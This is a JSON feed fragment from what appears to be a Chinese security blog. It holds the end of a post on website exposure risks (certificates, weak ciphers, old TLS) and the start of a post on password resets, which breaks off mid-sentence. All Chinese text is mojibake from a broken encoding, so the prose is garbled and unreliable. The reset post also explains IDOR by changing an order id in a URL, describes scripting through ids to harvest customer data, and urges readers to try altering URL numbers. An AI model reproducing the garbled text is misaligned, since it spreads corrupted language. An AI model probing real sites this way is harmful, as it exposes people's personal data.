ç‚ºå…©ç¨®æª¢æŸ¥æ†‘è­‰æ˜¯å¦è¢«æ’¤éŠ·çš„æ–¹å¼ï¼Œç”¨æ–¼å®¢æˆ¶ç«¯é©—è­‰ä¼ºæœå™¨æ˜¯å¦å¯ä»¥ä¿¡ä»»ã€‚</p>\n<h3 id=\"%E6%86%91%E8%AD%89%E6%8E%88%E6%AC%8A%E6%A9%9F%E9%97%9C%E8%B3%87%E6%BA%90%E7%B4%80%E9%8C%84%E6%AA%A2%E6%9F%A5%EF%BC%9A\"><a class=\"direct-link\" href=\"#%E6%86%91%E8%AD%89%E6%8E%88%E6%AC%8A%E6%A9%9F%E9%97%9C%E8%B3%87%E6%BA%90%E7%B4%80%E9%8C%84%E6%AA%A2%E6%9F%A5%EF%BC%9A\">#</a> <strong>æ†‘è­‰æˆæ¬Šæ©Ÿé—œè³‡æºç´€éŒ„æª¢æŸ¥ï¼š</strong></h3>\n<p>æˆæ¬ŠæŸ CA ç‚ºæŸæ©Ÿæ§‹ç™¼è¡Œæ†‘è­‰çš„ DNS ç´€éŒ„ï¼Œèƒ½ç¢ºä¿åªæœ‰æˆæ¬Šçš„ CA èƒ½ç‚ºæ¥­è€…çš„ç¶²åŸŸç™¼è¡Œæ†‘è­‰ï¼Œé˜²æ­¢ä»»æ„ CA æ“…è‡ªç°½ç½²ç¶²åŸŸçš„æ†‘è­‰ã€‚</p>\n<h3 id=\"%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8A%A0%E5%AF%86%EF%BC%9A\"><a class=\"direct-link\" href=\"#%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8A%A0%E5%AF%86%EF%BC%9A\">#</a> <strong>ä½¿ç”¨ä¸å®‰å…¨çš„åŠ å¯†ï¼š</strong></h3>\n<p>å¯èƒ½æ˜¯ä½å¼·åº¦åŠ å¯†å¥—ä»¶ä½¿ç”¨å·²çŸ¥ä¸”å…¬é–‹çš„æ¼”ç®—æ³•é€²è¡Œè³‡æ–™æ··æ·†æˆ–æ˜¯éèˆŠå·²è¢«ç ´è§£çš„åŠ å¯†æ³•ã€‚</p>\n<h3 id=\"%E6%86%91%E8%AD%89%E9%81%8E%E6%9C%9F%EF%BC%9A\"><a class=\"direct-link\" href=\"#%E6%86%91%E8%AD%89%E9%81%8E%E6%9C%9F%EF%BC%9A\">#</a> <strong>æ†‘è­‰éæœŸï¼š</strong></h3>\n<p>æ†‘è­‰ä¸åˆæ³•ã€å·²éæœŸã€æˆ–æ˜¯è¢«æ’¤éŠ·è€Œå¤±æ•ˆã€‚</p>\n<h3 id=\"%E9%81%8E%E8%88%8A%E7%9A%84-ssl%2Ftls-%E5%8D%94%E8%AD%B0%EF%BC%9A\"><a class=\"direct-link\" href=\"#%E9%81%8E%E8%88%8A%E7%9A%84-ssl%2Ftls-%E5%8D%94%E8%AD%B0%EF%BC%9A\">#</a> <strong>éèˆŠçš„ SSL/TLSÂ å”è­°ï¼š</strong></h3>\n<p>SSLï¼ˆ Secure Sockets Layerï¼‰å®‰å…¨é€šè¨Šç«¯å±¤ï¼Œå¯ä»¥ç”¨æ–¼ä¿æŒç¶²éš›ç¶²è·¯é€£ç·šå®‰å…¨é˜²æ­¢ç³»çµ±ä¹‹é–“çš„æ•æ„Ÿè³‡æ–™è¢«é§­å®¢è®€å–ç”šè‡³ä¿®æ”¹ä»»ä½•å‚³è¼¸è³‡è¨Šã€‚<br>\nÂ TLSï¼ˆ Transport Layer Securityï¼‰å‚³è¼¸å±¤å®‰å…¨æ€§ï¼Œå–ä»£ SSL çš„åŠ å¯†å”å®šï¼Œæ¯” èµ· SSL èƒ½æä¾›æ›´é«˜æ›´å®‰å…¨çš„é€£ç·šã€‚</p>\n<p>è€Œä½¿ç”¨éèˆŠæˆ–å·²å»¢æ£„çš„å”è­°å¯èƒ½å°è‡´é§­å®¢åˆ©ç”¨å·²çŸ¥æ¼æ´ç«Šå–å‚³è¼¸ä¸­çš„æ©Ÿæ•è³‡æ–™ã€‚</p>\n<h3 id=\"%E5%88%9D%E6%AD%A5%E8%87%AA%E6%88%91%E6%AA%A2%E8%A6%96%E6%96%B9%E5%BC%8F-5\"><a class=\"direct-link\" href=\"#%E5%88%9D%E6%AD%A5%E8%87%AA%E6%88%91%E6%AA%A2%E8%A6%96%E6%96%B9%E5%BC%8F-5\">#</a> åˆæ­¥è‡ªæˆ‘æª¢è¦–æ–¹å¼</h3>\n<p>ä»¥ Chrome ç‚ºä¾‹ï¼Œé»æ“Šç¶²å€å·¦æ–¹å°é–é ­å¯ä»¥çœ‹åˆ°ç›®å‰æ˜¯å¦ç‚ºå®‰å…¨é€£ç·šä»¥åŠæ†‘è­‰æ˜¯å¦æœ‰æ•ˆï¼Œé»é¸æ†‘è­‰å¾Œå¯ä»¥çœ‹è¦‹æ†‘è­‰è©³ç´°è³‡è¨Šï¼Œåœ¨ github ä¸Šä¹Ÿæœ‰æä¾›è¨±å¤šæ†‘è­‰æ¸¬è©¦å·¥å…·ï¼Œå¯ä»¥æ ¹æ“šéœ€æ±‚é¸æ“‡å·¥å…·æˆ–æ˜¯é‡å°å·¥å…·é€²è¡Œèª¿æ•´ã€‚</p>\n<p><img src=\"/img/posts/jo/zerobased-common-risk-exposure/p3.png\" alt=\"\"><br>\n<img src=\"/img/posts/jo/zerobased-common-risk-exposure/p4.png\" alt=\"\"></p>\n<h2 id=\"%E5%B0%8F%E7%B5%90\"><a class=\"direct-link\" href=\"#%E5%B0%8F%E7%B5%90\">#</a> å°çµ</h2>\n<p><strong>å¸¸è¦‹æ›éšªçš„ç™¼ç”ŸåŸå› å¤§è‡´æœ‰å…©ç¨®</strong></p>\n<ol>\n<li>ç‚ºäº†æ–¹ä¾¿æ¥­è€…ä½¿ç”¨æ‰€ä»¥æœ‰äº›ç¶²é æ‡‰ç”¨æˆ–ä¼ºæœå™¨ç«¯çš„é è¨­å€¼æœƒä»¥å¯ç”¨æ€§ç‚ºå„ªå…ˆé€²è¡Œè€ƒé‡ï¼Œä¹Ÿå› æ­¤ç•¶è¨±å¤šçš„æ¥­è€…ç›´æ¥æ¡ç”¨é è¨­å€¼è€Œæœªé€²è¡Œé…ç½®æª¢è¦–æ™‚ï¼Œå¾ˆæœ‰å¯èƒ½å› æ­¤ç”¢ç”Ÿé¢¨éšªã€‚</li>\n<li>æœ‰æ™‚æ¥­è€…çˆ²äº†æ›´å¥½çš„åœ¨ç¶²ç«™ä¸­ä½¿ç”¨ç¬¬ä¸‰æ–¹å¥—ä»¶æˆ–è€…æ˜¯é–‹ç™¼æ™‚ç¨‹åƒç·Šçš„ç·£æ•…è€Œæ¡ç”¨äº†ä¸å®‰å…¨çš„é…ç½®ä½¿é¢¨éšªç”¢ç”Ÿã€‚</li>\n</ol>\n<p>ç¶œåˆä¸Šè¿°å…©é»ï¼Œå…¶å¯¦åœ¨æ²’æœ‰é€²è¡Œéè©•ä¼°æˆ–æ˜¯åŸ·è¡Œé¢¨éšªç®¡ç†çš„æƒ…æ³ä¸‹ï¼Œå¾ˆå®¹æ˜“è¡ç”Ÿæ›éšªä½¿ç¶²ç«™æˆç‚ºæ”»æ“Šç›®æ¨™ï¼Œä¸Šè¿°æ˜¯ç›®å‰ç™¼ç”Ÿæ¯”ä¾‹å¤§æ–¼ 50 % çš„ç¶²è·¯æ›éšªèªªæ˜åŠéå¸¸åˆæ­¥çš„è‡ªæˆ‘æª¢æ¸¬æ–¹å¼ï¼Œå¦‚æœå¸Œæœ›èƒ½æ›´ç²¾ç¢ºçš„é‡å°è‡ªèº«ç¶²ç«™çš„é¢¨éšªé€²è¡Œè©•ä¼°åŠç®¡ç†çš„è©±ï¼Œå»ºè­°å¯ä»¥ä»¥æ–‡ä¸­çš„é—œéµå­—å»æœå°‹ç›¸é—œå·¥å…·é€²è¡Œæª¢æ¸¬ã€‚</p>\n<p>ä½†è‹¥å¸Œæœ›çœæ™‚ä¸”æ“”å¿ƒ<strong>æª¢æ¸¬å‡ºå•é¡Œä¸çŸ¥é“è©²å¦‚ä½•ä¿®å¾©</strong>æˆ–æ˜¯<strong>ä¿®å¾©å•é¡Œçš„ CP å€¼è©²å¦‚ä½•è¡¡é‡</strong>çš„è©±ï¼Œå¯ä»¥å°‹æ‰¾ç›¸é—œçš„è³‡å®‰æœå‹™é€²è¡Œæ›éšªè©•ä¼°ã€‚</p>\n<p>ä»¥è‡ªèº«ç‚ºä¾‹ï¼ŒCymetrics ä¾¿æœ‰æä¾›ç¶²ç«™è³‡å®‰æ›éšªè©•ä¼°çš„æœå‹™ï¼ŒåŒ…å«<strong>å¯¦æ™‚é¢¨éšªæƒ…è³‡èª¿æ•´è©•ç´šæ¬Šé‡</strong>ä»¥åŠ<strong>é—œéµå­—å½¢å¼çš„å…¨ä¸­æ–‡é¢¨éšªå»ºè­°</strong>åŠ<strong>è¤‡é›œåº¦æ”¹å–„è©•ç´šè±¡é™</strong>çš„è³‡å®‰æœå‹™ï¼Œå¦‚æœæœ‰ç›¸é—œçš„è³‡å®‰éœ€æ±‚ä¹Ÿæ­¡è¿å°‡ Cymetrics çš„ç”¢å“åˆ—å…¥æ¯”è¼ƒã€‚</p>\n<h2 id=\"%E5%BB%B6%E4%BC%B8%E9%96%B1%E8%AE%80%EF%BC%9A\"><a class=\"direct-link\" href=\"#%E5%BB%B6%E4%BC%B8%E9%96%B1%E8%AE%80%EF%BC%9A\">#</a> å»¶ä¼¸é–±è®€ï¼š</h2>\n<h3 id=\"%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E4%B8%80%EF%BC%89-%E8%AA%8D%E8%AD%98-csrf%EF%BC%88cross-site-request-forgery-%EF%BC%89\"><a class=\"direct-link\" href=\"#%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E4%B8%80%EF%BC%89-%E8%AA%8D%E8%AD%98-csrf%EF%BC%88cross-site-request-forgery-%EF%BC%89\">#</a> é›¶åŸºç¤è³‡å®‰ç³»åˆ—ï¼ˆä¸€ï¼‰-èªè­˜ CSRFï¼ˆCross Site Request ForgeryÂ ï¼‰</h3>\n<blockquote>\n<p><a href=\"https://tech-blog.cymetrics.io/jo/zerobased-cross-site-request-forgery\">èªè­˜ CSRFï¼ˆCross Site Request Forgeryï¼‰</a></p>\n</blockquote>\n<h3 id=\"%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E4%BA%8C%EF%BC%89-%E8%AA%8D%E8%AD%98-xss%EF%BC%88cross-site-scripting%EF%BC%89\"><a class=\"direct-link\" href=\"#%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E4%BA%8C%EF%BC%89-%E8%AA%8D%E8%AD%98-xss%EF%BC%88cross-site-scripting%EF%BC%89\">#</a> é›¶åŸºç¤è³‡å®‰ç³»åˆ—ï¼ˆäºŒï¼‰-èªè­˜ XSSï¼ˆCross-Site Scriptingï¼‰</h3>\n<blockquote>\n<p><a href=\"https://tech-blog.cymetrics.io/jo/zerobased-cross-site-scripting\">èªè­˜ XSSï¼ˆCross-Site Scriptingï¼‰</a></p>\n</blockquote>\n<h3 id=\"%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E4%B8%89%EF%BC%89-%E7%B6%B2%E7%AB%99%E5%AE%89%E5%85%A8%E4%B8%89%E6%9C%AC%E6%9F%B1%EF%BC%88secure-%26-samesite-%26-httponly%EF%BC%89\"><a class=\"direct-link\" href=\"#%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E4%B8%89%EF%BC%89-%E7%B6%B2%E7%AB%99%E5%AE%89%E5%85%A8%E4%B8%89%E6%9C%AC%E6%9F%B1%EF%BC%88secure-%26-samesite-%26-httponly%EF%BC%89\">#</a> é›¶åŸºç¤è³‡å®‰ç³»åˆ—ï¼ˆä¸‰ï¼‰-ç¶²ç«™å®‰å…¨ä¸‰æœ¬æŸ±ï¼ˆSecure &amp; SameSite &amp; HttpOnlyï¼‰</h3>\n<blockquote>\n<p><a href=\"https://tech-blog.cymetrics.io/jo/zerobased-secure-samesite-httponly/\">ç¶²ç«™å®‰å…¨ä¸‰æœ¬æŸ±ï¼ˆSecure &amp; SameSite &amp; HttpOnlyï¼‰</a></p>\n</blockquote>\n<h2 id=\"%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99%EF%BC%9A\"><a class=\"direct-link\" href=\"#%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99%EF%BC%9A\">#</a> <strong>åƒè€ƒè³‡æ–™ï¼š</strong></h2>\n<h3 id=\"x-frame-options%EF%BC%9A\"><a class=\"direct-link\" href=\"#x-frame-options%EF%BC%9A\">#</a> X-Frame-Optionsï¼š</h3>\n<blockquote>\n<p><a href=\"https://developer.mozilla.org/zh-TW/docs/Web/HTTP/Headers/X-Frame-Options#%E4%BD%BF%E7%94%A8_x-frame-options\">https://developer.mozilla.org/zh-TW/docs/Web/HTTP/Headers/X-Frame-Options</a></p>\n</blockquote>\n<h3 id=\"gartner-list-of-critical-security-projects%EF%BC%9A\"><a class=\"direct-link\" href=\"#gartner-list-of-critical-security-projects%EF%BC%9A\">#</a> Gartner list of critical security projectsï¼š</h3>\n<blockquote>\n<p><a href=\"https://www.gartner.com/smarterwithgartner/gartner-top-security-projects-for-2020-2021/\">https://www.gartner.com/smarterwithgartner/gartner-top-security-projects-for-2020-2021/</a></p>\n</blockquote>\n<h3 id=\"dmarc%EF%BC%9A\"><a class=\"direct-link\" href=\"#dmarc%EF%BC%9A\">#</a> DMARCï¼š</h3>\n<blockquote>\n<p><a href=\"https://support.google.com/a/answer/10032674?hl=zh-Hant&amp;ref_topic=2759254\">https://support.google.com/a/answer/10032674?hl=zh-Hant&amp;ref_topic=2759254</a></p>\n</blockquote>\n",
      "date_published": "2021-07-09T08:00:00+08:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/huli/why-only-reset-password-not-retrieve-password/",
      "url": "https://tech-blog.cymetrics.io/posts/huli/why-only-reset-password-not-retrieve-password/",
      "title": "ç‚ºä»€éº¼å¿˜è¨˜å¯†ç¢¼æ™‚åªèƒ½é‡è¨­ï¼Œä¸æŠŠèˆŠå¯†ç¢¼å‘Šè¨´æˆ‘ï¼Ÿ",
      "content_html": "<p>æŸå¤©å°æ˜åœ¨æ•´ç†ä»–çš„æˆ‘çš„æœ€æ„›ï¼ˆåˆ°åº•èª°çš„ï¼‰ï¼Œç™¼ç¾äº†ä¸€å€‹ä»¥å‰å¾ˆå¸¸é€›ï¼Œä½†å·²ç¶“å°‡è¿‘åŠå¹´å¤šæ²’å»çš„ä¸€å€‹è«–å£‡ã€‚å°æ˜æƒ³å›å»çœ‹çœ‹é‚£é‚Šè®Šå¾—æ€éº¼æ¨£äº†ï¼Œæ–¼æ˜¯é»é€²å»é‚£å€‹è«–å£‡ï¼Œè¼¸å…¥äº†å¸³è™Ÿå¯†ç¢¼ï¼Œå¾—åˆ°äº†å¯†ç¢¼éŒ¯èª¤çš„å›è¦†ã€‚</p>\n<p>å˜—è©¦äº†å¹¾æ¬¡ä¹‹å¾Œï¼Œç³»çµ±æç¤ºå°æ˜å¯ä»¥ä½¿ç”¨ã€Œå¿˜è¨˜å¯†ç¢¼ã€çš„åŠŸèƒ½ï¼Œæ‰€ä»¥å°æ˜å¡«äº†è‡ªå·±çš„ email ä¹‹å¾Œå»ä¿¡ç®±æ”¶ä¿¡ï¼Œç™¼ç¾ç³»çµ±å‚³ä¾†ä¸€å€‹ã€Œé‡è¨­å¯†ç¢¼ã€çš„é€£çµã€‚é›–ç„¶èªªæœ€å¾Œå°æ˜æˆåŠŸåˆ©ç”¨é‡æ–°è¨­å®šçš„å¯†ç¢¼ç™»å…¥ï¼Œä½†æœ‰å€‹å•é¡Œè®“ä»–ç™¾æ€ä¸å¾—å…¶è§£ï¼š</p>\n<blockquote>\n<p>ã€Œå¥‡æ€ªæ¬¸ï¼Œå¹¹å˜›è¦æˆ‘é‡è¨­å¯†ç¢¼ï¼Œç‚ºä»€éº¼ä¸æŠŠèˆŠçš„å¯†ç¢¼å¯„çµ¦æˆ‘å°±å¥½ï¼Ÿã€</p>\n</blockquote>\n<!-- summary -->\n<p>æ‡‰è©²æœ‰è¨±å¤šäººéƒ½è·Ÿå°æ˜ä¸€æ¨£ï¼Œæœ‰éé¡ä¼¼çš„ç–‘æƒ‘ã€‚æŠŠèˆŠå¯†ç¢¼å¯„çµ¦æˆ‘ä¸æ˜¯å¾ˆå¥½å—ï¼Œå¹¹å˜›å¼·è¿«æˆ‘æ›å¯†ç¢¼ï¼Ÿ</p>\n<p>é€™ä¸€å€‹çœ‹ä¼¼ç°¡å–®çš„å•é¡Œï¼ŒèƒŒå¾Œå…¶å¯¦è—äº†è¨±å¤šè³‡è¨Šå®‰å…¨ç›¸é—œçš„æ¦‚å¿µï¼Œå°±è®“æˆ‘å€‘æ…¢æ…¢å°‹æ‰¾å•é¡Œçš„ç­”æ¡ˆï¼Œé †ä¾¿å­¸ç¿’ä¸€äº›åŸºæœ¬çš„è³‡å®‰çŸ¥è­˜å§ï¼</p>\n<!-- summary -->\n<p>å…ˆæé†’ä¸€ä¸‹ï¼Œé›–ç„¶èªªå‰åŠæ®µçœ‹èµ·ä¾†å¯èƒ½è·Ÿæ–‡ç« ä¸»é¡Œç„¡é—œï¼Œä½†å¥½é…’æ²‰ç”•åº•ï¼Œæˆ‘ä¿è­‰æœ€å¾ŒæœƒæŠŠé€™äº›æ±è¥¿é—œè¯èµ·ä¾†ã€‚</p>\n<h2 id=\"%E8%A2%AB%E5%81%B7%E8%B5%B0%E7%9A%84%E8%B3%87%E6%96%99%E5%BA%AB\"><a class=\"direct-link\" href=\"#%E8%A2%AB%E5%81%B7%E8%B5%B0%E7%9A%84%E8%B3%87%E6%96%99%E5%BA%AB\">#</a> è¢«å·èµ°çš„è³‡æ–™åº«</h2>\n<p>å¤§å®¶æ‡‰è©²å¾ˆå¸¸çœ‹åˆ°æ–°èèªªå“ªå€‹ç¶²ç«™çš„è³‡æ–™åˆè¢«å·èµ°äº†ï¼Œé¡§å®¢å€‹è³‡å…¨éƒ¨éƒ½å¤–æ´©å‡ºå»ã€‚ä¾‹å¦‚èªª<a href=\"https://tw.news.yahoo.com/%E5%80%8B%E8%B3%87%E9%81%AD%E6%B4%A9-%E9%BA%A5%E7%95%B6%E5%8B%9E%E8%81%B2%E6%98%8E-%E4%B8%8D%E5%90%AB%E4%BB%98%E6%AC%BE%E8%B3%87%E6%96%99-103012207.html\">éº¥ç•¶å‹</a>åœ¨è¿‘æœŸå°±ç™¼ç”Ÿäº†é¡ä¼¼çš„äº‹ä»¶ï¼š</p>\n<p><img src=\"/img/posts/huli/reset-password/p1.png\" alt=\"éº¥ç•¶å‹è³‡æ–™å¤–æ´©çš„é€šçŸ¥ä¿¡\"></p>\n<p>é€™é‚Šæˆ‘æƒ³å¸¶å¤§å®¶æ¢è¨çš„å…©å€‹å•é¡Œæ˜¯ï¼š</p>\n<ol>\n<li>è³‡æ–™çœŸçš„é€™éº¼å®¹æ˜“å¤–æ´©å—ï¼Ÿ</li>\n<li>è³‡æ–™å¤–æ´©ä¹‹å¾Œï¼Œå¯èƒ½é€ æˆä»€éº¼å¾Œæœï¼Ÿ</li>\n</ol>\n<p>æˆ‘å€‘å…ˆä¾†çœ‹ç¬¬ä¸€å€‹å•é¡Œï¼Œæœ‰å¾ˆå¤šå®‰å…¨æ€§çš„æ¼æ´å¯ä»¥é€ æˆè³‡æ–™å¤–æ´©ï¼Œè€Œæœ‰äº›æ¼æ´çš„æ”»æ“Šæ–¹å¼ï¼Œæ¯”ä½ æƒ³çš„é‚„ç°¡å–®ä¸€ç™¾å€ã€‚</p>\n<p><img src=\"/img/posts/huli/reset-password/p2.jpeg\" alt=\"Photo by Arget on Unsplash\"></p>\n<p>ä½ æƒ³åƒä¸­çš„é§­å®¢å¯èƒ½åƒä¸Šé¢é‚£æ¨£ï¼Œæ‰“è‘—ä¸€å¤§å †ä¸çŸ¥é“åœ¨å¹¹å˜›çš„æŒ‡ä»¤ï¼Œç•«é¢ä¸Šå‡ºç¾å¾ˆå¤šé»‘åº•ç™½å­—æˆ–æ˜¯ç¶ å­—çš„ç•«é¢ï¼Œå®Œå…¨æä¸æ‡‚åœ¨å¹¹å˜›ï¼Œä½†æ˜¯åšè‘—åšè‘—ç¶²ç«™å°±è¢«æ‰“ä¸‹ä¾†äº†ã€‚</p>\n<p>è€Œäº‹å¯¦ä¸Šæœ‰äº›æ¼æ´ï¼Œå¯èƒ½åœ¨ç¶²å€åˆ—ä¸Šé¢æ”¹å¹¾å€‹å­—å°±æ”»æ“ŠæˆåŠŸäº†ï¼Œå°±ç®—ä½ ä¸æ‡‚ä»»ä½•ç¨‹å¼ä¹Ÿåšå¾—åˆ°ã€‚</p>\n<p>èˆ‰ä¾‹ä¾†èªªå¥½äº†ï¼Œå‡è¨­ä»Šå¤©æœ‰å€‹è³¼ç‰©ç¶²ç«™ï¼Œä½ è²·äº†ä¸€äº›æ±è¥¿ä¹‹å¾Œé€å‡ºè¨‚å–®ï¼Œè¨‚å–®æˆç«‹å¾Œè·³è½‰åˆ°è¨‚å–®é é¢ï¼Œä¸Šé¢æœ‰è‘—ä¸€å¤§å †ä½ çš„å€‹è³‡ï¼Œä¾‹å¦‚èªªï¼šå§“åã€æ”¶è²¨åœ°å€ã€è¯çµ¡é›»è©±ä»¥åŠ Email ç­‰ç­‰ã€‚</p>\n<p>ç„¶å¾Œä½ ç™¼ç¾è¨‚å–®é é¢çš„ç¶²å€æ˜¯ <a href=\"https://shop.huli.tw/orders?id=14597\">https://shop.huli.tw/orders?id=14597</a></p>\n<p>è€Œæ­£å¥½ä½ çš„è¨‚å–®ç·¨è™Ÿä¹Ÿæ˜¯ 14597ï¼Œåœ¨å¥½å¥‡å¿ƒçš„é©…ä½¿ä¹‹ä¸‹ï¼Œä½ å°±è©¦è‘—æŠŠæ•¸å­—æ”¹æˆ 14596ï¼Œç„¶å¾ŒæŒ‰ä¸‹ Enterã€‚</p>\n<p>ç•¶ç¶²ç«™è¼‰å…¥å®Œæˆä¹‹å¾Œï¼Œä½ ç«Ÿç„¶é‚„çœŸçš„èƒ½çœ‹åˆ°ç·¨è™Ÿç‚º 14596 çš„è¨‚å–®ï¼Œä¸Šé¢å‡ºç¾ä¸€å€‹ä½ ä¸èªè­˜çš„äººçš„å§“åã€æ”¶è²¨åœ°å€ã€è¯çµ¡é›»è©±è·Ÿ Emailã€‚</p>\n<p>æœ‰äº›æ”»æ“Šå°±æ˜¯é€™éº¼æ¨¸å¯¦ç„¡è¯ä¸”æ¯ç‡¥ï¼Œåªè¦æ”¹å€‹å­—å°±èƒ½çœ‹åˆ°å±¬æ–¼å…¶ä»–äººçš„è³‡æ–™ã€‚é€™æ™‚å€™å¦‚æœä½ æœƒå¯«ç¨‹å¼çš„è©±ï¼Œå°±å¯ä»¥å¯«å€‹è…³æœ¬è‡ªå‹•å»æŠ“ id æ˜¯ 1 ä¸€ç›´åˆ° id æ˜¯ 15000 çš„è³‡æ–™ï¼Œä½ å°±æ‹¿åˆ°äº†é€™å€‹è³¼ç‰©ç¶²ç«™ 15000 ç­†è¨‚å–®çš„è³‡è¨Šï¼Œä¹Ÿå°±æ˜¯ä¸€è¬å¤šå€‹é¡§å®¢çš„å€‹è³‡ã€‚</p>\n<p>é€™éç¨‹ä¸­æ²’æœ‰ä»€éº¼é»‘åº•ç™½å­—çš„ç•«é¢ï¼Œä¹Ÿä¸ç”¨ä¸€ç›´ç˜‹ç‹‚æ‰“å­—ï¼Œå”¯ä¸€éœ€è¦çš„åªæœ‰æ”¹æ•¸å­—ï¼Œå€‹è³‡å°±è¼•é¬†åˆ°æ‰‹ã€‚</p>\n<p>é€™é¡å‹çš„æ¼æ´æœ‰å€‹å°ˆæœ‰åè©ï¼Œç¨±ç‚º IDORï¼Œå…¨åæ˜¯ï¼šInsecure direct object referencesï¼Œå¤§ç´„å°±æ˜¯ä¸å®‰å…¨çš„ç›´æ¥è³‡æ–™å­˜å–çš„æ„æ€ã€‚æ¼æ´ç”¢ç”Ÿçš„åŸå› å°±æ˜¯å·¥ç¨‹å¸«åœ¨é–‹ç™¼æ™‚ï¼Œä¸¦æ²’æœ‰æ³¨æ„åˆ°æ¬Šé™æ§ç®¡ï¼Œå› æ­¤è®“ä½¿ç”¨è€…èƒ½å­˜å–åˆ°å…¶ä»–äººçš„è³‡æ–™ã€‚</p>\n<p>æœ‰äº›äººçœ‹åˆ°é€™é‚Šå¯èƒ½ä»¥ç‚ºæˆ‘åªæ˜¯ç‚ºäº†æ–‡ç« æ·ºé¡¯æ˜“æ‡‚ï¼Œæ‰€ä»¥æ‰èˆ‰ä¸€å€‹ç°¡åŒ–çš„ä¾‹å­ï¼Œç¾å¯¦ç”Ÿæ´»ä¸­çš„æ”»æ“Šæ‰æ²’é€™éº¼ç°¡å–®ã€‚</p>\n<p>é€™å¥è©±ç®—æ˜¯å°äº†ä¸€åŠï¼Œå¤§éƒ¨åˆ†çš„ç¶²ç«™ç¢ºå¯¦éƒ½ä¸æœƒæœ‰é€™éº¼æ˜é¡¯çš„ä¸€å€‹æ¼æ´ï¼Œæ”»æ“Šæ–¹å¼æœƒæ›´è¤‡é›œä¸€é»ã€‚ä½†å¯æ€•çš„æ˜¯ï¼Œé‚„çœŸçš„æœ‰äº›ç¶²ç«™å°±æ˜¯é€™éº¼ç°¡å–®ï¼Œå°±æ˜¯æ”¹å€‹æ•¸å­—å°±å¯ä»¥æ‹¿åˆ°åˆ¥äººçš„è³‡æ–™ã€‚</p>\n<p>å°ç£æœ‰ä¸€å€‹ç¶²ç«™å«åš <a href=\"https://zeroday.hitcon.org/\">HITCON ZeroDay</a>ï¼Œæ˜¯ç”±å°ç£é§­å®¢å”æœƒæ‰€ç¶­è­·çš„æ¼æ´å›å ±å¹³å°ã€‚æœ‰äº›äººç™¼ç¾æ¼æ´ä¹‹å¾Œå¯èƒ½æœƒç«Šå–å€‹è³‡æ‹¿å»è³£ï¼Œå¾äº‹éæ³•è¡Œç‚ºï¼Œä¹Ÿæœ‰äº›äººç™¼ç¾æ¼æ´åªæ˜¯ç‚ºäº†é›éŠæŠ€è¡“ï¼Œä¸¦æ²’æœ‰æƒ³è¦åšä»€éº¼å£äº‹ã€‚</p>\n<p>å› æ­¤å°±å¯ä»¥é€éé€™å€‹å¹³å°é€²è¡Œå›å ±ï¼Œå›å ±æ¼æ´ä¹‹å¾Œè² è²¬ç¶­è­·å¹³å°çš„å¿—å·¥å€‘æœƒå¹«ä½ é©—è­‰æ¼æ´ï¼Œé©—è­‰éå¾Œå›å ±çµ¦è² è²¬çš„å» å•†ï¼Œè®“ä»–å€‘å»ä¿®å¾©æ¼æ´ã€‚</p>\n<p>é€™å€‹å¹³å°ä¸Šçš„æ¼æ´åœ¨ä¿®å¾©éå¾Œéš”ä¸€é™£å­æœƒå…¬é–‹ï¼Œæˆ–è€…å„˜ç®¡å» å•†æ²’æœ‰å›å ±ä¿®å¾©ï¼Œéä¸€é™£å­ï¼ˆä¾‹å¦‚èªªå…©å€‹æœˆï¼‰å¾Œä¹Ÿæœƒå…¬é–‹ï¼Œå› æ­¤åœ¨é€™å¹³å°ä¸Šå¯ä»¥æ‰¾åˆ°è¨±å¤šå…¬é–‹çš„æ¼æ´ï¼Œçœ‹éä¹‹å¾Œä½ å¤§æ¦‚å°±ä¸æœƒæƒ³åœ¨ç¶²ç«™è¨»å†Šæ™‚ç•™ä¸‹çœŸå¯¦å€‹è³‡äº†â€¦</p>\n<p>ä¾‹å¦‚èªªé€™å…©å€‹å°±æ˜¯ IDOR çš„çœŸå¯¦æ¼æ´ï¼š</p>\n<ol>\n<li><a href=\"https://zeroday.hitcon.org/vulnerability/ZD-2021-00206\">äº«å¥èº«xarefit ä»»æ„è¨ªå•/ä¸‹è¼‰æ‰€æœ‰æœƒå“¡å€‹è³‡</a></li>\n<li><a href=\"https://zeroday.hitcon.org/vulnerability/ZD-2021-00260\">DoorGods é˜²ç–«é–€ç¥å¯¦è¯åˆ¶ç³»çµ±IDORå°è‡´å€‹è³‡å¤–æ´©</a></li>\n</ol>\n<p>å°ï¼Œä¸è¦æ‡·ç–‘ï¼Œå°±çœŸçš„åªæ˜¯åœ¨ç¶²å€ä¸Šæ”¹å€‹æ•¸å­—è€Œå·²é€™éº¼å®¹æ˜“ã€‚</p>\n<p>ä»¥å¾Œåªè¦çœ‹åˆ°ç¶²å€åˆ—ä¸Šæœ‰é€™ç¨®æ•¸å­—ï¼Œå°±å¯ä»¥è©¦è‘—å»æ”¹æ”¹çœ‹ï¼Œæä¸å¥½ä¸æœƒå¯«ç¨‹å¼çš„ä½ ä¹Ÿå¯ä»¥ç™¼ç¾ IDOR çš„æ¼æ´ã€‚</p>\n<p>é™¤äº†é€™ç¨®åªè¦æ”¹å€‹æ±è¥¿çš„æ¼æ´ä¹‹å¤–ï¼Œé‚„æœ‰å¦å¤–ä¸€å€‹å¾ˆå¸¸è¦‹ä½†æ˜¯éœ€è¦ä¸€é»æŠ€è¡“èƒ½åŠ›æ‰èƒ½æ”»ç ´çš„æ¼æ´ï¼Œå«åš SQL Injectionã€‚</p>\n<p>å…ˆä¾†è¬›è¬› 